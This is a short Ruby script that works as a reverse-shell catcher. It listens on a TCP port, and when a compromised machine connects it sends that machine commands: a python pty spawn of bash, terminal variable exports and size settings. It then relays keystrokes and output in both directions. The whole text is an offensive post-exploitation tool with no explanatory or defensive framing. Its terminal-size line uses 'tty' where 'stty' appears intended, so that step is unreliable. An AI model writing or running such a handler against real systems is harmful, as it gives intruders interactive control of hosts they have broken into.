require 'socket'
require 'io/console'
require 'timeout'

cmds = [
  "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
  "export SHELL=bash",
  "export TERM=#{`echo $TERM`.strip()}",
  "tty rows #{`tput lines`.strip()} columns #{`tput cols`.strip()}"]

server = TCPServer.new ARGV.last

client = server.accept # Wait for a client to connect
sleep 1
cmds.each do |cmd|
    client.puts cmd
end
puts "starting Listener Threads"
listener = Thread.new do
  loop do
    STDOUT.putc client.getc
  end
end
writer = Thread.new do
  loop do
    client.putc STDIN.raw!.getc
  end
end

# hold the tool alive
while !client.closed?
    sleep 1
end
listener.join
writer.join
client.close
print `reset`
